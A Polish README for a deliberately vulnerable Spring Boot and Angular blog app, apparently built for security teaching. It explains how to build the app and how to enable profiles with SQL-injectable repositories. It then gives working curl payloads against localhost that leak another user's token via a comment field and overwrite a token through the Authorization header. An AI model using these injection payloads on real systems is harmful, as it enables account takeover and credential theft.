# Blog application

## Jak uruchomić?

Aplikacja składa się z dwóch modułów - `application/server` zawierający backend w `Spring Boot` oraz `application/frontend` zawierający aplikację frontendową opartą o `Angular`.

Projekt skonstruowany jest w taki sposób, że `application/frontend` jest zależnością do `application/server`. Zatem budując serwer, najpierw musi zostać zbudowany frontend. Wszystko jest już ze sobą połączone.


1. Aby uruchomić aplikację wystarczy użyć taska:
    ```
    ./gradlew bootRun
    ```
    
    > W przypadku problemów z cache'owaniem plików frontendowych, można użyć dodatkowo taska `clean`:
    > ```
    > ./gradlew clean bootRun
    > ```
    
    Po wydaniu polecenia w konsoli widać:
    
    ```
    2021-05-03 16:32:50.045  INFO 41222 --- [           main] o.s.s.concurrent.ThreadPoolTaskExecutor  : Initializing ExecutorService 'applicationTaskExecutor'
    2021-05-03 16:32:50.096  INFO 41222 --- [           main] o.s.b.a.w.s.WelcomePageHandlerMapping    : Adding welcome page: class path resource [static/index.html]
    2021-05-03 16:32:50.240  INFO 41222 --- [           main] o.s.s.web.DefaultSecurityFilterChain     : Will secure any request with [org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter@71a7cf7c, org.springframework.security.web.context.SecurityContextPersistenceFilter@447630c4, org.springframework.security.web.header.HeaderWriterFilter@951e911, org.springframework.security.web.authentication.logout.LogoutFilter@62ff14cd, pl.kul.blog.infrastructure.authentication.filters.pwd.UsernameAndPasswordAuthenticationFilter@7f49df25, pl.kul.blog.infrastructure.authentication.filters.token.TokenAuthenticationFilter@5b29d699, org.springframework.security.web.savedrequest.RequestCacheAwareFilter@4c8afba, org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter@5c65fa69, org.springframework.security.web.authentication.AnonymousAuthenticationFilter@5a5a973c, org.springframework.security.web.session.SessionManagementFilter@7022fb5c, org.springframework.security.web.access.ExceptionTranslationFilter@4d6027be, org.springframework.security.web.access.intercept.FilterSecurityInterceptor@3d605657]
    2021-05-03 16:32:50.274  INFO 41222 --- [           main] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat started on port(s): 8080 (http) with context path ''
    2021-05-03 16:32:50.281  INFO 41222 --- [           main] pl.kul.blog.BlogApplication              : Started BlogApplication in 2.51 seconds (JVM running for 2.748)
    <============-> 93% EXECUTING [43s]
    > :application:server:bootRun
    ```
    Zostaje uruchomiony serwer HTTP, który nasłuchuje na porcie 8080.

2. Następnie należy wejść na stronę http://localhost:8080/ i założyć nowego użytkownika
   
    > Zarówno zakładanie użytkownika jak i logowanie zajmuje kilka sekund - to celowy zabieg `Spring`'a
3. Volia!

## Budowanie pliku wykonywalnego

Został użyty plugin `org.beryx.runtime`, który definiuje dodatkowy task o nazwie `jpackage`. Task ten wykorzystuje pod spodem [narzędzie dostępne w JDK (>= 15) `jpackage`](https://openjdk.java.net/jeps/392). Narzędzie umożliwia utworzenie kopii maszyny wirutalnej (klient uruchamiający aplikację nie musi mieć swojego własnego `JRE`) i załącza odpowiednie skrypty uruchamiające (per platforma).

Aby zbudować plik wykonywalny, należy użyć polecenia:

```
./gradlew jpackage
```

Wówczas w katalogu `application/server/build/jpackage` powstanie katalog, który zawiera plik `.exe` oraz wszystkie wymagane zależności. Cały ten katalog można spakować i traktować jako aplikację w wersji `portable`.

## Znane problemy/rzeczy do zrobienia

* Najwyższy priorytet
  * [ ] Diagramy prezentujące flow uwierzytelniania użytkownika
* Nice to have
  * [ ] Po odświeżeniu strony/zamknięciu karty użytkownik musi się zalogować. Powodem jest przechowywanie tokena w pamęci, zamiast np. `localStorage`
  * [ ] Brak obsługi błędów połączenia HTTP. Jeżeli np. podczas logowania (`POST /authentication/signin`) poleci błąd 4xx, wówczas na frontendzie "nic nie widać"
* Done
    * Najwyższy priorytet
        * [x] Brak możliwości dodawania nowych postów i komentarzy (trzeba zaimplementować)
    * Nice to have
        * [x] Backend używa bazy danych H2 uruchamianej w pamięci - oznacza to, że po każdym restarcie serwer ma czystą bazę. Trzeba dodać konfigurację umożliwiającą zmianę trybu działania H2 na opartą o plik + możliwość konfiguracji ścieżki.

## SQL Injection

W aplikacji jest zestaw bean'ów odpowiadających za zapis do bazy. Te, które nosza nazwę `Vulnerable*Repository` są podatne na atak `SQL Injection`. Aby uruchomić aplikację z zestawem bean'ów wrażliwych na ten atak, należy aktywować konkretne profile:

* `token-auth-check-vulnerable-to-sql-injection`
* `comments-vulnerable-to-sql-injection`

> Widok zarządzający aplikacją umożliwia włączenie w/w profili.

Jeżeli konkretny profil dotyczący konkretnej funkcjonalności jest aktywny, wówczas ładowany jest odpowiedni zestaw bean'ów (wszystko zawarte wewnątrz `RepositoriesConfiguration`).

## Wyciągnięcie dowolnej pojedynczej wartości z bazy i zapisanie jej w komentarzu

> Test integracyjny `SqlInjection_exploitAddComment` umożliwia symulację tej podatności

```bash
curl 'http://localhost:8080/api/comments/4a2efc6b-ffd7-4b13-b5cb-9913ac47dd17' \
    -X 'PUT' \
    -H 'Connection: keep-alive' \
    -H 'Accept: application/json' \
    -H 'Authorization: token pxsAnl/LzCqynQTzGZg+vPISd54tOxtHWadre9zdXN2y+aWKrv1Cpk6PBMMahUeHj2AJUs8fSRGJIQczb83Erg==' \
    -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36' \
    -H 'Content-Type: application/json' \
    -H 'Sec-GPC: 1' \
    -H 'Origin: http://localhost:8080' \
    -H 'Sec-Fetch-Site: same-origin' \
    -H 'Sec-Fetch-Mode: cors' \
    -H 'Sec-Fetch-Dest: empty' \
    -H 'Referer: http://localhost:8080/' \
    -H 'Accept-Language: en-US,en;q=0.9' \
    --data-binary '{"addToPostId":"f0e69366-5fb7-42c5-ae77-a371043728d6","content":"'\'' + (select token from user_device where user_account_id = (select id from user_account where username = '\''test'\'')) + '\''"}' \
    --compressed
```

## Aktualizacja tokena dowolnego użytkownika

Ustawienie tokena użytkownikowi `test`:
```
curl 'http://localhost:8080/api/posts' \
    -H 'Connection: keep-alive' \
    -H 'Accept: application/json' \
    -H 'Authorization: token '\''; ;update user_device set token='\''sql-injected'\'' where USER_ACCOUNT_ID = (select id from USER_ACCOUNT where USERNAME = '\''test'\'') -- ' \
    -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36' \
    -H 'Sec-GPC: 1' \
    -H 'Sec-Fetch-Site: same-origin' \
    -H 'Sec-Fetch-Mode: cors' \
    -H 'Sec-Fetch-Dest: empty' \
    -H 'Referer: http://localhost:8080/' \
    -H 'Accept-Language: en-US,en;q=0.9' \
    --compressed
```

Pobranie postów ze zmienionym tokenem:
```
    curl 'http://localhost:8080/api/posts' \
    -H 'Connection: keep-alive' \
    -H 'Accept: application/json' \
    -H 'Authorization: token sql-injected' \
    -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36' \
    -H 'Sec-GPC: 1' \
    -H 'Sec-Fetch-Site: same-origin' \
    -H 'Sec-Fetch-Mode: cors' \
    -H 'Sec-Fetch-Dest: empty' \
    -H 'Referer: http://localhost:8080/' \
    -H 'Accept-Language: en-US,en;q=0.9' \
    --compressed
```
